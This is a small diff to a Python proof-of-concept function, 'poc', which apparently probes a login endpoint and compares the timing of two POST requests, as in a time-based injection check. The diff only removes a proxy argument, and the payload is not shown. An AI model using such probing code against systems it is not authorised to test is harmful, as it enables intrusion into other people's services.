@@ -59,7 +59,7 @@ def poc(target):
     try:
         res1 = requests.get(url=target + payload, headers=headers, verify=False)
         if res1.status_code == 200 and "username and password" in res1.text:
-            res2 = requests.post(url=target + payload, headers=headers, data=data, verify=False, proxies=proxies)
+            res2 = requests.post(url=target + payload, headers=headers, data=data, verify=False)
             res3 = requests.post(url=target + payload, headers=headers, verify=False)
             time1 = res2.elapsed.total_seconds()
             time2 = res3.elapsed.total_seconds()
